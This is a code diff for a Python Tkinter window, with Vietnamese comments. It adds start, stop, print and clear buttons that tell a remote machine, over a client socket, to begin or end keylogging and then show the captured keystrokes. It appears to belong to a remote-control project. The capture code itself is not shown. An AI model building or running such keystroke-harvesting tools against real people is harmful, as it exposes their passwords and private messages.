@@ -14,6 +14,9 @@ class keylogger_view:
         self.top.title("KEYLOGGER")
         self.top.configure(background="#d9d9d9", highlightbackground="#d9d9d9", highlightcolor="#000000")
 
+        self.text_bat_keylogger = tk.Text(self.top, wrap="word")  # Tự động xuống dòng theo từ
+        self.text_bat_keylogger.place(relx=0.05, rely=0.15, relwidth=0.89, height=400)
+
         # Create an instance of WidgetFactory
         self.widget_factory = WidgetFactory(self.top)
         self.create_widgets()
@@ -21,19 +24,40 @@ class keylogger_view:
     def create_widgets(self):
         # Button configuration using WidgetFactory
         self.btn_start_keylogger = self.widget_factory.create_button("BAT KEYLOGGER", 0.05, 0.043, 107, 36)
-        self.btn_stop_keylogger = self.widget_factory.create_button("TAT KEYLOGGER", 0.27, 0.043, 107, 36)
-        self.btn_print_keylogger = self.widget_factory.create_button("IN KEYLOGGER", 0.488, 0.043, 127, 36)
-        self.btn_clear = self.widget_factory.create_button("CLEAR", 0.738, 0.041, 127, 36)
+        self.btn_start_keylogger.configure(command= self.btn_start_keylogger_click)
         
-        # Tạo entrey
-        self.entry_bat_keylogger = self.widget_factory.create_entry(0.05, 0.15, 0.89, 400)
+        self.btn_stop_keylogger = self.widget_factory.create_button("TAT KEYLOGGER", 0.27, 0.043, 107, 36)
+        self.btn_stop_keylogger.configure(command= self.btn_stop_keylogger_click)
+        
+        self.btn_print_keylogger = self.widget_factory.create_button("IN KEYLOGGER", 0.488, 0.043, 127, 36)
+        self.btn_print_keylogger.configure(command= self.btn_print_keylogger_click)
+        
+        self.btn_clear = self.widget_factory.create_button("CLEAR", 0.738, 0.041, 127, 36)
+        self.btn_clear.configure(command= self.btn_clear_click)
     
-    def update_entry(self, text):
-        self.entry_bat_keylogger.delete(0, tk.END)
-        self.entry_bat_keylogger.insert(0, text)
+    def btn_start_keylogger_click(self):
+        self.controller.start_keylogger(self.client_socket)
+        self.show_message("Keylogger started!")
+                
+    def btn_stop_keylogger_click(self):
+        keys_to_stop = self.controller.stop_keylogger(self.client_socket)
+        self.update_text_widget("\n".join(keys_to_stop))
+        self.show_message("Keylogger stopped and keys fetched.")       
+    
+    def btn_print_keylogger_click(self):
+        self.clear_text_widget()
+        keys_from_server = self.controller.print_keylogger(self.client_socket)
+        self.update_text_widget(keys_from_server)
 
-    def get_entry_text(self):
-        return self.entry_bat_keylogger.get()
+    def btn_clear_click(self):   
+        self.clear_text_widget()
+        self.show_message("Text widget cleared.")
+    
+    def update_text_widget(self, text):
+        self.text_bat_keylogger.insert("end", text)
+
+    def clear_text_widget(self):
+        self.text_bat_keylogger.delete("1.0", "end")  # Xóa từ dòng đầu tiên đến cuối cùng
 
     def show_message(self, message):
         messagebox.showinfo("Info", message)
